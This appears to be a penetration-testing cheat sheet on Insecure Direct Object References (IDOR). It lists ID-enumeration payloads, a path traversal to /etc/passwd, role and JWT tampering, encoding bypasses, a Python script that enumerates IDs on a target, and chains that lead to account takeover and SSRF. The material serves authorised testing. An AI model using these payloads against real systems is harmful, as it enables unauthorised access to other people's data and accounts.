# Insecure Direct Object References (IDOR): Complete Reference

## Detection Methodology

### Numeric ID Enumeration
```bash
# Sequential enumeration
/api/users/1, /api/users/2, /api/users/3
/api/orders/1000, /api/orders/1001
/api/invoices/INV-001, /api/invoices/INV-002

# Guessing admin IDs
/api/users/1, /api/users/0, /api/users/admin
/api/user?userId=1, /api/user?userId=0, /api/user?userId=admin
```

### UUID/Hash-Based IDs
```bash
# Predictable UUIDs (v1 timestamps, sequential)
/api/user/550e8400-e29b-11d4-a716-446655440000
# Increment timestamp portion

# Hash-based IDs (weak hashes, base64 encoded)
# Decode base64 IDs
echo "dXNlcl8xMjM=" | base64 -d  # user_123
echo "YWRtaW4=" | base64 -d      # admin

# Incremental hash IDs (often MD5 of sequential numbers)
MD5(1) = c4ca4238a0b923820dcc509a6f75849b
MD5(2) = c81e728d9d4c2f636f067f89cc14862c
```

### Batch/Array IDOR
```json
// GraphQL batch query
{ "users": [ { "id": 1 }, { "id": 2 }, { "id": 3 } ] }

// REST batch endpoint
POST /api/users/batch
{ "ids": [1, 2, 3, 4, 5] }

// Array parameter injection
?user_ids[]=1&user_ids[]=2&user_ids[]=3
```

### CVSS v3.1 Scoring
| Scenario | CVSS | Criteria |
|----------|------|----------|
| IDOR reading other users' PII | 7.5 | Network, Low, No auth, Confidentiality high, User interaction required |
| IDOR -> modify other users' data | 8.1 | Network, Low, No auth, Integrity high |
| IDOR -> admin privilege escalation | 8.8 | Network, Low, No auth, All high |
| IDOR chained with info disclosure -> ATO | 9.1 | Network, Low, No auth, All high, Cascade exploit |

## Exploitation Techniques

### Horizontal Privilege Escalation
```bash
# User A sees only their own data
# Change ID to see User B's data
curl -b "session=USERA_SESSION" /api/account/123
curl -b "session=USERA_SESSION" /api/account/124  # User B's account?

# Multi-parameter IDOR
/api/account/view?user_id=456&account_id=789
# Try swapping: user_id=789&account_id=456
```

### Vertical Privilege Escalation
```bash
# Regular user tries to access admin endpoints
curl -b "session=USER_SESSION" /api/admin/users
curl -b "session=USER_SESSION" /api/admin/settings
curl -b "session=USER_SESSION" /api/users/1/admin

# Change role parameter
/api/user/update?role=admin&user_id=123
/api/user/profile?admin=true
```

### Parameter Manipulation
```bash
# Object reference in different formats
/api/user?id=123
/api/user/123
/api/user?user_id=123
/api/user?userId=123
/api/user?uid=123
/api/user?account=123
/api/user?profile=123
/api/user?u=123
/api/user?target=123
```

### JSON Body ID Manipulation
```json
// PUT /api/profile/update
// Change the user_id in the request body
{ "user_id": 456, "email": "victim@target.com" }

// Mass assignment
{ "id": 456, "role": "admin", "email": "new@target.com" }

// Hidden fields in JWT
// JWT might contain: {"user":1,"role":"user"}
// Change to: {"user":2,"role":"admin"}
```

### Path Traversal in Object References
```bash
/api/../admin/users
/api/../../../etc/passwd
/api/users/./../admin/settings
/api/v1/../v2/admin/users
```

### IDOR via Headers
```bash
# Custom header based access
X-User-Id: 123
X-Account-Id: 456
X-Organization: admin
X-Company-Id: 789
X-Impersonate: admin
```

## Blind IDOR
```bash
# No direct response data, but timing/status differs
# Compare response codes
curl -s -o /dev/null -w "%{http_code}" /api/user/1  # 200
curl -s -o /dev/null -w "%{http_code}" /api/user/2  # 200 (IDOR exists even if body is empty)

# Compare response sizes
curl -s /api/user/1 | wc -c
curl -s /api/user/2 | wc -c

# Compare response times (might be slower when fetching real data)
```

## Detection Automation

### Autorize (Burp Extension)
Records a baseline request as low-privilege user, then replays with different sessions to detect access control failures.

### AuthMatrix (Burp Extension)
Matrix-based testing across multiple user roles:
- Unauthenticated
- User A (regular)
- User B (regular)
- Admin
- Test each role against each endpoint

### Custom Automation Script
```python
import requests

users = [1, 2, 3, 4, 5, 100, 1000]
endpoints = [
    "/api/users/{}",
    "/api/account/{}",
    "/api/order/{}",
    "/api/profile/{}",
]

my_session = "SESSION_COOKIE"

for uid in users:
    for endpoint in endpoints:
        url = f"https://target.com{endpoint.format(uid)}"
        r = requests.get(url, cookies={"session": my_session})
        if r.status_code == 200 and uid != 123:  # 123 is my user
            print(f"Potential IDOR: {url} -> {r.status_code} ({len(r.text)} bytes)")
```

## Bypass Techniques

### ID in Non-Standard Formats
```bash
# Hex encoding
/api/user/0x7b  (0x7b = 123)

# Double encoding
/api/user/%313233  (URL double-encoded)

# Base64 encoding
/api/user/MTIz  (base64 of "123")

# Array parameter
/api/user?id[]=123

# Object parameter
/api/user?id[value]=123

# Wildcard/pattern
/api/user/*
/api/user/%
```

### Missing Authorization Checks via HTTP Methods
```bash
# If GET is blocked, try POST/PUT/DELETE
GET /api/user/123  # 403 Forbidden
POST /api/user/123  # 200 OK (IDOR)
PUT /api/user/123   # 200 OK

# HEAD request
HEAD /api/user/123  # Check if resource exists
```

## Chaining IDOR
```bash
# IDOR -> Info Disclosure -> Account Takeover
1. IDOR on /api/user/2 reveals: email=victim@target.com
2. Password reset for victim@target.com
3. Account compromised

# IDOR -> Privilege Escalation
1. IDOR on /api/team/members reveals admin user IDs
2. Access admin endpoints with discovered IDs
3. Full administrative access

# IDOR -> SSRF chain
1. IDOR reveals internal service URLs
2. Use discovered URLs for SSRF attacks
3. Access internal cloud metadata
```